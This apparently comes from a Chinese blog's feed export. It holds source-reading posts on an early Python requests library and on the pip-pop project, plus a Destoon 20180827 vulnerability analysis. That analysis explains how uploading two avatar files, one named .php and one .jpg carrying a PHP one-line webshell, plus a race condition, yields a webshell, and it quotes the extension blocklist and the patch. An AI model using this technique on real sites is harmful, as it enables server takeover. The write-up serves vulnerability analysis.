:class:`Request` objects contain a :class:`Request.response &lt;response&gt;` attribute, which is an instance of this class. """ def __init__(self): self.content = None self.status_code = None self.headers = dict() def __repr__(self): try: repr = '&lt;Response [%s]&gt;' % (self.status_code) except: repr = '&lt;Response object&gt;' return repr AuthObject 类该类暂时仅在 test_requests.py 中出现，用于设置认证的用户名和密码。代码如下：12345678910111213class AuthObject(object): """The :class:`AuthObject` is a simple HTTP Authentication token. When given to a Requests function, it enables Basic HTTP Authentication for that Request. You can also enable Authorization for domain realms with AutoAuth. See AutoAuth for more details.s :param username: Username to authenticate with. :param password: Password for given username. """ def __init__(self, username, password): self.username = username self.password = password 请求方法get、post、put、delete和认证相关的方法 ，在代码结构上大同小异。 get123456789101112131415161718192021222324def get(url, params=&#123;&#125;, headers=&#123;&#125;, auth=None): """Sends a GET request. Returns :class:`Response` object. :param url: URL for the new :class:`Request` object. :param params: (optional) Dictionary of GET Parameters to send with the :class:`Request`. :param headers: (optional) Dictionary of HTTP Headers to sent with the :class:`Request`. :param auth: (optional) AuthObject to enable Basic HTTP Auth. """ # 获取 Request对象 r = Request() # 设置基本的请求参数 r.method = 'GET' r.url = url r.params = params r.headers = headers # 设置认证信息 r.auth = _detect_auth(url, auth) # 发起请求 r.send() # 返回响应 return r.response head123456789101112131415161718192021222324def head(url, params=&#123;&#125;, headers=&#123;&#125;, auth=None): """Sends a HEAD request. Returns :class:`Response` object. :param url: URL for the new :class:`Request` object. :param params: (optional) Dictionary of GET Parameters to send with the :class:`Request`. :param headers: (optional) Dictionary of HTTP Headers to sent with the :class:`Request`. :param auth: (optional) AuthObject to enable Basic HTTP Auth. """ # 获取 Request对象 r = Request() # 设置基本信息 r.method = 'HEAD' r.url = url # return response object r.params = params r.headers = headers r.auth = _detect_auth(url, auth) # 发处请求 r.send() # 返回响应 return r.response post123456789101112131415161718192021222324def post(url, data=&#123;&#125;, headers=&#123;&#125;, auth=None): """Sends a POST request. Returns :class:`Response` object. :param url: URL for the new :class:`Request` object. :param data: (optional) Dictionary of POST Data to send with the :class:`Request`. :param headers: (optional) Dictionary of HTTP Headers to sent with the :class:`Request`. :param auth: (optional) AuthObject to enable Basic HTTP Auth. """ # 获取Request对象 r = Request() # 设置基本信息 r.url = url r.method = 'POST' r.data = data r.headers = headers r.auth = _detect_auth(url, auth) # 发起请求 r.send() # 返回响应 return r.response put123456789101112131415161718192021222324def put(url, data='', headers=&#123;&#125;, auth=None): """Sends a PUT request. Returns :class:`Response` object. :param url: URL for the new :class:`Request` object. :param data: (optional) Bytes of PUT Data to send with the :class:`Request`. :param headers: (optional) Dictionary of HTTP Headers to sent with the :class:`Request`. :param auth: (optional) AuthObject to enable Basic HTTP Auth. """ # 获取Request对象 r = Request() # 设置基本信息 r.url = url r.method = 'PUT' r.data = data r.headers = headers r.auth = _detect_auth(url, auth) # 发起请求 r.send() # 返回响应 return r.response delete12345678910111213141516171819202122232425def delete(url, params=&#123;&#125;, headers=&#123;&#125;, auth=None): """Sends a DELETE request. Returns :class:`Response` object. :param url: URL for the new :class:`Request` object. :param params: (optional) Dictionary of GET Parameters to send with the :class:`Request`. :param headers: (optional) Dictionary of HTTP Headers to sent with the :class:`Request`. :param auth: (optional) AuthObject to enable Basic HTTP Auth. """ # 获取Request对象 r = Request() # 设置基本信息 r.url = url r.method = 'DELETE' # return response object r.headers = headers r.auth = _detect_auth(url, auth) # 发起请求 r.send() # 返回响应 return r.response 认证相关从上面的请求方法实现中，可以发现有的请求带了如r.auth = _detect_auth(url, auth) 对于种种请求方法，我们不想在每次请求中都明确指出这次请求需不需要认证，但有些请求确实需要认证，因此在各种请求方法中都有一个可选参数auth=None，然后通过调用r.auth = _detect_auth(url, auth)来进一步设置。_detect_auth代码如下 1234567891011121314151617def _detect_auth(url, auth): """Returns registered AuthObject for given url if available, defaulting to given AuthObject.""" return _get_autoauth(url) if not auth else authdef _get_autoauth(url): """Returns registered AuthObject for given url if available. """ for (autoauth_url, auth) in AUTOAUTHS: if autoauth_url in url: return auth return None 对于明确指出需要认证的请求，自然auth参数也会指定。如果auth参数没有指定，则会调用_get_autoauth来查看是否有对应的规则。这个规则列表则由全局变量AUTOAUTHS来维护，如果请求的url包含autoauth_url，则返回autoauth_url对应的auth。如果不包含，则直接返回None。 为了维护这个全局变量AUTOAUTHS，它实现了一个add_autoauth方法如下： 123456789101112131415161718def add_autoauth(url, authobject): """Registers given AuthObject to given URL domain. for auto-activation. Once a URL is registered with an AuthObject, the configured HTTP Authentication will be used for all requests with URLS containing the given URL string. Example: :: &gt;&gt;&gt; c_auth = requests.AuthObject('kennethreitz', 'xxxxxxx') &gt;&gt;&gt; requests.add_autoauth('https://convore.com/api/', c_auth) &gt;&gt;&gt; r = requests.get('https://convore.com/api/account/verify.json') # Automatically HTTP Authenticated! Wh00t! :param url: Base URL for given AuthObject to auto-activate for. :param authobject: AuthObject to auto-activate. """ global AUTOAUTHS AUTOAUTHS.append((url, authobject)) 异常相关不做过多解释。1234567891011class RequestException(Exception): """There was an ambiguous exception that occured while handling your request."""class AuthenticationError(RequestException): """The authentication credentials provided were invalid."""class URLRequired(RequestException): """A valid URL is required to make a request."""class InvalidMethod(RequestException): """An inappropriate method was attempted."""]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[pip-pop 源码阅读]]></title>
      <url>%2F2018%2F10%2F12%2Fpip-pop-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%2F</url>
      <content type="text"><![CDATA[pip-pop源码阅读 项目地址https://github.com/heroku-python/pip-pop 按照commit记录来阅读。 lawyer upcommit记录： a84bc7439770063e457760a18119c10e5d802d3e 添加了LICENSE文件，采用MIT License dummy dircommit记录： 636935f9394165c1d55c0e0d878cea60428a434e 创建了 pip_pop文件夹，在其中创建空文件__init__.py。 此时项目结构如下：123456.├── LICENSE└── pip_pop └── __init__.py1 directory, 2 files READ ITcommit记录： ebdda7f8897403e9b77a2fa7023b2f4f8df1ecaa 项目结构如下：123456├── LICENSE├── README.rst└── pip_pop └── __init__.py1 directory, 3 files 增加了README.rst文件。用于说明该项目的用处，计划中实现的功能，未来可能实现的功能。12345678pip-pop: tools for managing requirements files==============================================Planned Commands----------------Possible Future Commands------------------------ docoptcommit记录： f0e51cc56f55c4615e29b7a12264b20dbe12db66 项目结构如下：12345678.├── LICENSE├── README.rst├── pip_pop│ └── __init__.py└── requirements.txt1 directory, 4 files 增加了requirements.txt文件。 note about blacklisting planscommit记录： bf54913eaa70f9f505c414a7be328ff15040f37f 项目结构如下：12345678.├── LICENSE├── README.rst├── pip_pop│ └── __init__.py└── requirements.txt1 directory, 4 files 修改READEME.rst文件。 Update READEME.rstcommit记录： 2b444bc846071148dedf6773555e8b33f895765c 项目结构如下：12345678.├── LICENSE├── README.rst├── pip_pop│ └── __init__.py└── requirements.txt1 directory, 4 files 修改README.rst文件 exescommit记录： fd65e4d148939f1c7405370e1f342f1fa1b3ea14 项目结构如下：123456789101112.├── LICENSE├── README.rst├── bin│ ├── pip-diff│ └── pip-flatten├── pip_pop│ └── __init__.py├── requirements.txt└── setup.py2 directories, 7 files 新增bin/pip-diff，bin/pip-flatten和setup.py。 bin/pip-diff和bin/pip-flatten均是空文件。 setup.py用于python库打包。代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849"""pip-pop manages your requirements files."""import sysfrom setuptools import setupsetup( name='pip-pop', version='0.0.0', url='https://github.com/kennethreitz/pip-pop', license='MIT', author='Kenneth Reitz', author_email='me@kennethreitz.org', description=__doc__.strip('\n'), #packages=[], scripts=['bin/pip-diff', 'bin/pip-flatten'], #include_package_data=True, zip_safe=False, platforms='any', install_requires=['docopt'], classifiers=[ # As from https://pypi.python.org/pypi?%3Aaction=list_classifiers #'Development Status :: 1 - Planning', #'Development Status :: 2 - Pre-Alpha', #'Development Status :: 3 - Alpha', 'Development Status :: 4 - Beta', #'Development Status :: 5 - Production/Stable', #'Development Status :: 6 - Mature', #'Development Status :: 7 - Inactive', 'Programming Language :: Python', 'Programming Language :: Python :: 2', #'Programming Language :: Python :: 2.3', #'Programming Language :: Python :: 2.4', #'Programming Language :: Python :: 2.5', 'Programming Language :: Python :: 2.6', 'Programming Language :: Python :: 2.7', #'Programming Language :: Python :: 3', #'Programming Language :: Python :: 3.0', #'Programming Language :: Python :: 3.1', #'Programming Language :: Python :: 3.2', #'Programming Language :: Python :: 3.3', 'Intended Audience :: Developers', 'Intended Audience :: System Administrators', 'License :: OSI Approved :: BSD License', 'Operating System :: OS Independent', 'Topic :: System :: Systems Administration', ]) 从setuptools导入setup函数，其中参数的含义如下： 参数 含义 值 name 包名字 pip-pop version 包版本 0.0.0 url 程序官网地址 https://github.com/kennethreitz/pip-pop license 授权信息 MIT author 程序作者 Kenneth Reitz author_email 作者邮箱 me@kennethreitz.org description 程序简单描述 __doc__.strip(‘\n’) scripts 指定可执行脚本，安装时脚本会被添加到系统PATH中 [‘bin/pip-diff’, ‘bin/pip-flatten’] zip_safe 不压缩包，以目录形式安装 False platforms 程序适合的平台 ‘any’ install_requires 安装时需要安装的依赖包 [‘docopt’] classifiers 分类信息 详细见下 diffing works!commit记录： d58196205cea3a4650d68443dd90132bbd4b2b4e 项目结构如下：123456789101112.├── LICENSE├── README.rst├── bin│ ├── pip-diff│ └── pip-flatten├── pip_pop│ └── __init__.py├── requirements.txt└── setup.py2 directories, 7 files 更改了bin/pip-diff文件。代码整体的格式如下：12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# -*- coding: utf-8 -*-"""Usage: pip-diff (--fresh | --stale) &lt;reqfile1&gt; &lt;reqfile2&gt; pip-diff (-h | --help)Options: -h --help Show this screen. --fresh List newly added packages. --stale List removed packages."""import osfrom docopt import docoptfrom pkg_resources import parse_requirements# TODO: ignore linesIGNORABLE_LINES = '#', '-r'VERSION_OPERATORS = ['==', '&gt;=', '&lt;=', '&gt;', '&lt;', ',']def split(s):...class Requirements(object):...def diff(r1, r2, include_fresh=False, include_stale=False):...def main():...if __name__ == '__main__': main() 第一行#!/usr/bin/env python，用于为脚本语言指定解释器，这样可以直接./*.py的方式执行，不要使用#!/usr/bin/python，因为python可能不是安装在默认的环境。 第二行# -*- coding: utf-8 -*-用于指定编码为 utf-8，这样可以在py文件中写中文，方便写注释和消息。 最下面的if __name__ == &#39;__main__&#39;:的意思是，当该py文件被直接运行时，if __name__ == &#39;__main__&#39;:之下的main()将被调用执行，当该py文件被以模块的形式导入时，if __name__ == &#39;__main__&#39;:不被运行。 main()函数源代码如下：1234567891011def main(): args = docopt(__doc__, version='pip-diff') kwargs = &#123; 'r1': args['&lt;reqfile1&gt;'], 'r2': args['&lt;reqfile2&gt;'], 'include_fresh': args['--fresh'], 'include_stale': args['--stale'] &#125; diff(**kwargs) 通过args = docopt(__doc__, version=&#39;pip-diff&#39;) 来获取对应的命令行参数，参数要求见程序开头的那一段注释:12345678Usage: pip-diff (--fresh | --stale) &lt;reqfile1&gt; &lt;reqfile2&gt; pip-diff (-h | --help)Options: -h --help Show this screen. --fresh List newly added packages. --stale List removed packages. args解析完命令行参数后，会返回一个Dict类型。然后通过kwargs解析出对应的变量。。--fresh和--stale的作用是Generates a diff between two given requirements files. Lists either stale or fresh packages.。以命令行参数--fresh D:\temp\req1 D:\temp\req2为例 然后程序进入diff(**kwargs)， diff函数：123456789101112def diff(r1, r2, include_fresh=False, include_stale=False): # assert that r1 and r2 are files. try: r1 = Requirements(r1) r2 = Requirements(r2) except ValueError: print 'There was a problem loading the given requirements files.' exit(os.EX_NOINPUT) results = r1.diff(r2) print results Requirements对象定义如下，其中的diff函数先暂时省略：123456789101112131415161718192021222324252627282930313233343536373839class Requirements(object): """docstring for Requirements""" def __init__(self, reqfile=None): super(Requirements, self).__init__() self.path = reqfile self.requirements = [] if reqfile: self.load(reqfile) def __repr__(self): return '&lt;Requirements \'&#123;&#125;\'&gt;'.format(self.path) def load(self, reqfile): if not os.path.exists(reqfile): raise ValueError('The given requirements file does not exist.') with open(reqfile) as f: data = [] for line in f: line = line.strip() # Skip lines that start with any comment/control charecters. if not any([line.startswith(p) for p in IGNORABLE_LINES]): data.append(line) for requirement in parse_requirements(data): self.requirements.append(requirement) # assert that the given file exists # parse the file # insert those entries into self.declarations pass def diff(self, requirements, ignore_versions=False): 。。。 以Requirements(r1)为例，传入的参数为D:\\temp\\req1，在__init__中进入self.load(reqfile)，首先判断了文件的存在。然后对于文件中的每一行（for line in f:），去除它末尾的换行符（line = line.strip()），然后判断其是否以注释或控制字符开头（[line.startswith(p) for p in IGNORABLE_LINES]），若不是则将其加入到data中。之后调用parse_requirements(data)进行解析： 在pass之后，返回给r1 在r2对象实例化后，进行results = r1.diff(r2)，在class Requirements(object)中定义了diff方法代码如下：1234567891011121314151617181920212223242526272829303132class Requirements(object): ... def diff(self, requirements, ignore_versions=False): r1 = self r2 = requirements results = &#123;'fresh': [], 'stale': []&#125; # Generate fresh packages. other_reqs = ( [r.project_name for r in r1.requirements] if ignore_versions else r1.requirements ) for req in r2.requirements: r = req.project_name if ignore_versions else req if r not in other_reqs: results['fresh'].append(req) # Generate stale packages. other_reqs = ( [r.project_name for r in r2.requirements] if ignore_versions else r2.requirements ) for req in r1.requirements: r = req.project_name if ignore_versions else req if r not in other_reqs: results['stale'].append(req) return results output for pip-diff works!commit记录： d6ae563831228dd6d7e712d69763663032410391 项目结构如下：123456789101112.├── LICENSE├── README.rst├── bin│ ├── pip-diff│ └── pip-flatten├── pip_pop│ └── __init__.py├── requirements.txt└── setup.py2 directories, 7 files 根据参数的不同fresh或者stale，输出对应的结果。 req1内容如下：12req1test1 req2内容如下：12req2test2 则运行结果如下：1234567C:\Python27\python.exe D:/Learn/opensource/pip-pop/bin/pip-diff --stale D:\temp\req1 D:\temp\req2req1test1C:\Python27\python.exe D:/Learn/opensource/pip-pop/bin/pip-diff --fresh D:\temp\req1 D:\temp\req2req2test2 cleanupcommit记录： 2c2ffe318e5c539fc3bdef4feda97c56c162062a 项目结构及代码部分未做改变。 删除了原 pip-diff 中的一些注释 tuplescommit记录： 58f9ae5f9668a7613f7c0f9f1c43a105b2604891 将VERSION_OPERATORS从list改为tuple 。 其余无变化。 remove bunk filescommit记录： d1ff1029ca3d4bd765abe2d4e92b1c2700586702 项目结构变为：1234567│ LICENSE│ README.rst│ requirements.txt│ setup.py└─bin pip-diff pip-flatten 删除了pip-pop/__init__.py空文件 rely on pipcommit记录： d638b182d9302fa541efa48fbf99fa05f42a4565 项目结构未变 利用pip.req来解析req文件 getting simpler and simpler!commit记录：69d9e22c10734d463bde67c04cc469f0b0bce072 项目结构未变 因为直接利用pip.req来解析req文件，删除无用变量 only check lines that have explicit requirementscommit记录： 0837d1133ee25c645d763f670f6683a20bf30240 只有当requirement.req为真时，才添加到self.requirements中。 附上最新版的pip中的 parse_requirements的代码：123456789101112131415161718192021222324252627282930313233# C:/Python27/Lib/site-packages/pip/req/req_file.py:64def parse_requirements(filename, finder=None, comes_from=None, options=None, session=None, constraint=False, wheel_cache=None): """Parse a requirements file and yield InstallRequirement instances. :param filename: Path or url of requirements file. :param finder: Instance of pip.index.PackageFinder. :param comes_from: Origin description of requirements. :param options: cli options. :param session: Instance of pip.download.PipSession. :param constraint: If true, parsing a constraint file rather than requirements file. :param wheel_cache: Instance of pip.wheel.WheelCache """ if session is None: raise TypeError( "parse_requirements() missing 1 required keyword argument: " "'session'" ) _, content = get_file_content( filename, comes_from=comes_from, session=session ) lines_enum = preprocess(content, options) for line_number, line in lines_enum: req_iter = process_line(line, filename, line_number, finder, comes_from, options, session, wheel_cache, constraint=constraint) for req in req_iter: yield req 最后会返回一个迭代器 initial version of pip-grepcommit记录： 3862c2f9a2f72bb962e7ed15416109ee0ec3e5ae 项目结构变为：1234567│ LICENSE│ README.rst│ requirements.txt│ setup.py└─bin pip-diff pip-grep setup.py中： pip-flatten变为pip-grep，代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/env python# -*- coding: utf-8 -*-"""Usage: pip-grep &lt;reqfile&gt; &lt;package&gt;...Options: -h --help Show this screen."""import osfrom docopt import docoptfrom pip.req import parse_requirementsclass Requirements(object): def __init__(self, reqfile=None): super(Requirements, self).__init__() self.path = reqfile self.requirements = [] if reqfile: self.load(reqfile) def __repr__(self): return '&lt;Requirements \'&#123;&#125;\'&gt;'.format(self.path) def load(self, reqfile): if not os.path.exists(reqfile): raise ValueError('The given requirements file does not exist.') for requirement in parse_requirements(reqfile): self.requirements.append(requirement)def grep(reqfile, packages): try: # 读取reqfile文件并解析 r = Requirements(reqfile) except ValueError: print 'There was a problem loading the given requirement file.' exit(os.EX_NOINPUT) # 对于reuqirement中的每一个 for requirement in r.requirements: if requirement.req.project_name in packages: # 如果找到了在 packages中 print 'Package &#123;&#125; found!'.format(requirement.req.project_name) exit(0) print 'Not found.'.format(requirement.req.project_name) exit(1)def main(): # 获取参数 args = docopt(__doc__, version='pip-grep') kwargs = &#123;'reqfile': args['&lt;reqfile&gt;'], 'packages': args['&lt;package&gt;']&#125; # 传入 reqfile package grep(**kwargs)if __name__ == '__main__': main() updated readmecommit记录：2116d8a7698bf8fece0ad5c32db9ec9f69c97e69 更新readme文档，添加pip-grep的使用说明 fix for pip-grepcommit记录：2116d8a7698bf8fece0ad5c32db9ec9f69c97e69 silent mode for pip-grepcommit记录： 78e3c31b3584bfb263c061317ccc798cfaddf061 增加silent参数选项。作用位置 silence “not found”commit记录： 94c553879358aff40da2c3d2f536acb184703166 添加silent模式对not found情况的支持 python 3 compatibilitycommit纪录：70af45d95fd38e0a93abdbdb400283dcc495a00f 修改了pip-grep和pip-diff，将其中的print &#39;xx&#39; 改为print(&#39;xx&#39;) Add a dummy finder so parse_requirement does not fail on —argumentscommit记录：2aa545fb3b80d78670d923be4333e85f0abb7309 12345678910from pip.index import PackageFinderclass Requirements(object): 。。。 finder = PackageFinder([], []) for requirement in parse_requirements(reqfile, finder=finder): self.requirements.append(requirement) 。。。 新增加一个finder=finder参数，避免parse_requirements失败。 v0.1.0commit记录：2dc013300c4b0fb605fa9dd2a3fba5ecc81ac20c 修改setup.py，修改版本号为version=&#39;0.1.0&#39; Add option to print the requirement, if foundcommit记录： a3f9a4ba40c02d6bc26318e589ae2db11304203f 修改pip-grep文件。 首先是Usage部分：12345678&quot;&quot;&quot;Usage: pip-grep [-sp] &lt;reqfile&gt; &lt;package&gt;...Options: -h --help Show this screen. -s --silent Suppress output. -p --print-req If found, print the requirement.&quot;&quot;&quot; -p，在grep找到的情况下，打印出requirement support for lastest pipcommit记录： 27f35700c7d8affb1fc3b399bd77fe38fb82bba1 修改pip-diff。 由于parse_requirements中：12345678def parse_requirements(filename, finder=None, comes_from=None, options=None, session=None, constraint=False, wheel_cache=None): if session is None: raise TypeError( "parse_requirements() missing 1 required keyword argument: " "'session'" ) 所以添加session参数：123456789101112131415from pip._vendor.requests import sessionrequests = session()class Requirements(object): 。。。 def load(self, reqfile): if not os.path.exists(reqfile): raise ValueError('The given requirements file does not exist.') finder = PackageFinder([], [], session=requests) for requirement in parse_requirements(reqfile, finder=finder): if requirement.req: self.requirements.append(requirement.req) Update pip-grepcommit记录：90eba89335af5aa1285d179aa9ea6aa9725bd712 修改内容同上，增加session参数。 Merge pull request #3 from thenovices/print-line Add option to print the requirement, if found.commit记录：d572c00cc65a47f8d6e3d9446f8c21fb7aac685f 无 update from python buildpackcommit记录：097c4a94848897e693bf269150a49129d4019390 修改pip-diff和pip-grep的一些细节，增删参数。 exclude in pip-diffcommit记录：047dd63d5dd0a754d3e515bef7aa33d1246a548b 修改pip-diff文件，增加excludes参数选项，用于指定排除，不进行比较的packages包 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/usr/bin/env python# -*- coding: utf-8 -*-"""Usage: pip-diff (--fresh | --stale) &lt;reqfile1&gt; &lt;reqfile2&gt; [--exclude &lt;package&gt;...] pip-diff (-h | --help)Options: -h --help Show this screen. --fresh List newly added packages. --stale List removed packages."""import osfrom docopt import docoptfrom pip.req import parse_requirementsfrom pip.index import PackageFinderfrom pip._vendor.requests import sessionrequests = session()class Requirements(object): def diff(self, requirements, ignore_versions=False, excludes=None): 。。。 for req in r2.requirements: r = req.project_name if ignore_versions else req if r not in other_reqs and r not in excludes: results['fresh'].append(req) 。。。 for req in r1.requirements: r = req.project_name if ignore_versions else req if r not in other_reqs and r not in excludes: results['stale'].append(req) return resultsdef diff(r1, r2, include_fresh=False, include_stale=False, excludes=None): 。。。 excludes = excludes if len(excludes) else [] 。。。 results = r1.diff(r2, ignore_versions=True, excludes=excludes) 。。。def main(): kwargs = &#123; 。。。 'excludes': args['&lt;package&gt;'] &#125;if __name__ == '__main__': main() README.rst Fix spelling errorcommit记录：81587647408ff5adc13cc30a50ff84e36116505d 无他，修改README中的拼写错误 updatecommit记录：4f5ebcd253ec299baf0f4cb10c99d06bc52cc91f 修改两个文件pip-diff和pip-grep pip-diff中将project_name改为name。原因是pip版本升级，经过parse_requirements后会是name属性。但在8.1.2版本之前并不存在，因此需要在load时进行检测，增加代码如下： v0.0.1commit记录：4dc238c79ca19974eeb434ec4be4285d7747bb38 修改setup.py中的版本号 update setup.pycommit记录：07562561ce6aa9c733a18135cf510fadd794433a 修改setup.py中的一些参数Programming Language、Development Status 等 Require pip&gt;=1.5.0commit记录：99d9f36ad765535946af1fa9fc181d33668ee146 修改setup.py中的install_requires，要求pip版本大于1.5.0 Remove unused wsgiref from requirements.txtcommit记录：47ad229596ade5024d9c4c4190e73972176bc58b 删除requirements.txt中的无用条目 Add a tox config and some very primitive pip-grep and pip-diff testscommit记录：433e02ec7e294e171557514c55412cc3e06c1e53 项目结构：1234567891011121314│ .gitignore│ LICENSE│ README.rst│ requirements.txt│ setup.py│ tox.ini│├─bin│ pip-diff│ pip-grep│└─tests test-requirements.txt test-requirements2.txt 修改READEME.rst、setup.py、requirments.txt，主要是增加了tox的依赖，相关环境的安装。 新增文件tests文件夹及其文件、.gitignore、tox.ini。 Add Travis configcommit记录：a40d8850701f08c99d66cab2eedf283a0b326731 新增.travis.yml 。修改README.rst文件 Update PyPI classifiers to reflect tested Python versioncommit记录：e865cb31f4b43edd5f07aa8d40680d0b1eb08f28 阅读完毕。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Destoon 20180827版本 前台getshell]]></title>
      <url>%2F2018%2F09%2F24%2FDestoon-20180827%E7%89%88%E6%9C%AC-%E5%89%8D%E5%8F%B0getshell%2F</url>
      <content type="text"><![CDATA[Destoon 20180827版本 前台getshell 前言2018年9月21日，Destoon官方发布安全更新，修复了由用户“索马里的海贼”反馈的一个漏洞。 漏洞分析根据更新消息可知漏洞发生在头像上传处。Destoon中处理头像上传的是 module/member/avatar.inc.php 文件。在会员中心处上传头像时抓包，部分内容如下： 对应着avatar.inc.php代码如下：1234567891011121314151617181920212223242526272829&lt;?php defined('IN_DESTOON') or exit('Access Denied');login();require DT_ROOT.'/module/'.$module.'/common.inc.php';require DT_ROOT.'/include/post.func.php';$avatar = useravatar($_userid, 'large', 0, 2);switch($action) &#123; case 'upload': if(!$_FILES['file']['size']) &#123; if($DT_PC) dheader('?action=html&amp;reload='.$DT_TIME); exit('&#123;"error":1,"message":"Error FILE"&#125;'); &#125; require DT_ROOT.'/include/upload.class.php'; $ext = file_ext($_FILES['file']['name']); $name = 'avatar'.$_userid.'.'.$ext; $file = DT_ROOT.'/file/temp/'.$name; if(is_file($file)) file_del($file); $upload = new upload($_FILES, 'file/temp/', $name, 'jpg|jpeg|gif|png'); $upload-&gt;adduserid = false; if($upload-&gt;save()) &#123; ... &#125; else &#123; ... &#125; break; 这里通过$_FILES[&#39;file&#39;]依次获取了上传文件扩展名$ext、保存临时文件名$name、保存临时文件完整路径$file变量。之后通过new upload();创立一个upload对象，等到$upload-&gt;save()时再将文件真正写入。 upload对象构造函数如下，include/upload.class.php:25：1234567891011121314151617181920&lt;?phpclass upload &#123; function __construct($_file, $savepath, $savename = '', $fileformat = '') &#123; global $DT, $_userid; foreach($_file as $file) &#123; $this-&gt;file = $file['tmp_name']; $this-&gt;file_name = $file['name']; $this-&gt;file_size = $file['size']; $this-&gt;file_type = $file['type']; $this-&gt;file_error = $file['error']; &#125; $this-&gt;userid = $_userid; $this-&gt;ext = file_ext($this-&gt;file_name); $this-&gt;fileformat = $fileformat ? $fileformat : $DT['uploadtype']; $this-&gt;maxsize = $DT['uploadsize'] ? $DT['uploadsize']*1024 : 2048*1024; $this-&gt;savepath = $savepath; $this-&gt;savename = $savename; &#125;&#125; 这里通过foreach($_file as $file)来遍历初始化各项参数。而savepath、savename则是通过__construct($_file, $savepath, $savename = &#39;&#39;, $fileformat = &#39;&#39;)直接传入参数指定。 因此考虑上传了两个文件，第一个文件名是1.php，第二个文件是1.jpg，只要构造合理的表单上传（参考：https://www.cnblogs.com/DeanChopper/p/4673577.html），则在avatar.inc.php中123$ext = file_ext($_FILES['file']['name']); // `$ext`即为`php` $name = 'avatar'.$_userid.'.'.$ext; // $name 为 'avatar'.$_userid.'.'php'$file = DT_ROOT.'/file/temp/'.$name; // $file 即为 xx/xx/xx/xx.php 而在upload类中，由于多个文件上传，$this-&gt;file、$this-&gt;file_name、$this-&gt;file_type将foreach在第二次循环中被置为jpg文件。测试如下： 回到avatar.inc.php，当进行文件保存时调用$upload-&gt;save()，include/upload.class.php:50:12345678910111213141516171819202122&lt;?phpclass upload &#123; function save() &#123; include load('include.lang'); if($this-&gt;file_error) return $this-&gt;_('Error(21)'.$L['upload_failed'].' ('.$L['upload_error_'.$this-&gt;file_error].')'); if($this-&gt;maxsize &gt; 0 &amp;&amp; $this-&gt;file_size &gt; $this-&gt;maxsize) return $this-&gt;_('Error(22)'.$L['upload_size_limit'].' ('.intval($this-&gt;maxsize/1024).'Kb)'); if(!$this-&gt;is_allow()) return $this-&gt;_('Error(23)'.$L['upload_not_allow']); $this-&gt;set_savepath($this-&gt;savepath); $this-&gt;set_savename($this-&gt;savename); if(!is_writable(DT_ROOT.'/'.$this-&gt;savepath)) return $this-&gt;_('Error(24)'.$L['upload_unwritable']); if(!is_uploaded_file($this-&gt;file)) return $this-&gt;_('Error(25)'.$L['upload_failed']); if(!move_uploaded_file($this-&gt;file, DT_ROOT.'/'.$this-&gt;saveto)) return $this-&gt;_('Error(26)'.$L['upload_failed']); $this-&gt;image = $this-&gt;is_image(); if(DT_CHMOD) @chmod(DT_ROOT.'/'.$this-&gt;saveto, DT_CHMOD); return true; &#125;&#125; 先经过几个基本参数的检查，然后调用$this-&gt;is_allow()来进行安全检查 include/upload.class.php:72：1234567&lt;?php function is_allow() &#123; if(!$this-&gt;fileformat) return false; if(!preg_match("/^(".$this-&gt;fileformat.")$/i", $this-&gt;ext)) return false; if(preg_match("/^(php|phtml|php3|php4|jsp|exe|dll|cer|shtml|shtm|asp|asa|aspx|asax|ashx|cgi|fcgi|pl)$/i", $this-&gt;ext)) return false; return true; &#125; 可以看到这里仅仅对$this-&gt;ext进行了检查，如前此时$this-&gt;ext为jpg，检查通过。 接着会进行真正的保存。通过$this-&gt;set_savepath($this-&gt;savepath); $this-&gt;set_savename($this-&gt;savename);设置了$this-&gt;saveto，然后通过move_uploaded_file($this-&gt;file, DT_ROOT.&#39;/&#39;.$this-&gt;saveto)将file保存到$this-&gt;saveto ，注意此时的savepath、savename、saveto均以php为后缀，而$this-&gt;file实际指的是第二个jpg文件。 漏洞利用综上，上传两个文件，其中第一个文件以php为结尾如1.php，用于设置后缀名为php；第二个文件为1.jpg，jpg用于绕过检测，其内容为php一句话木马(图片马)。 然后访问http://127.0.0.1/file/temp/avatar1.php 即可。其中1是自己的_userid 不过实际利用上会有一定的限制。 第一点是destoon使用了伪静态规则，限制了file目录下php文件的执行。 第二点是avatar.inc.php中在$upload-&gt;save()后，会再次对文件进行检查，然后重命名为xx.jpg：12345678910111213省略...$img = array();$img[1] = $dir.'.jpg';$img[2] = $dir.'x48.jpg';$img[3] = $dir.'x20.jpg';$md5 = md5($_username);$dir = DT_ROOT.'/file/avatar/'.substr($md5, 0, 2).'/'.substr($md5, 2, 2).'/_'.$_username;$img[4] = $dir.'.jpg';$img[5] = $dir.'x48.jpg';$img[6] = $dir.'x20.jpg';file_copy($file, $img[1]);file_copy($file, $img[4]);省略... 因此要利用成功就需要条件竞争了。 补丁分析 在upload的一开始，就进行一次后缀名的检查。其中is_image如下：123function is_image($file) &#123; return preg_match("/^(jpg|jpeg|gif|png|bmp)$/i", file_ext($file));&#125; 在__construct()的foreach中使用了break，获取了第一个文件后就跳出循环。 在is_allow()中增加对$this-&gt;savename的二次检查。 最后嘛，祝各位大师傅中秋快乐！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[GitLab远程代码执行漏洞分析 -【CVE-2018-14364】]]></title>
      <url>%2F2018%2F09%2F10%2FGitLab%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-14364%E3%80%91%2F</url>
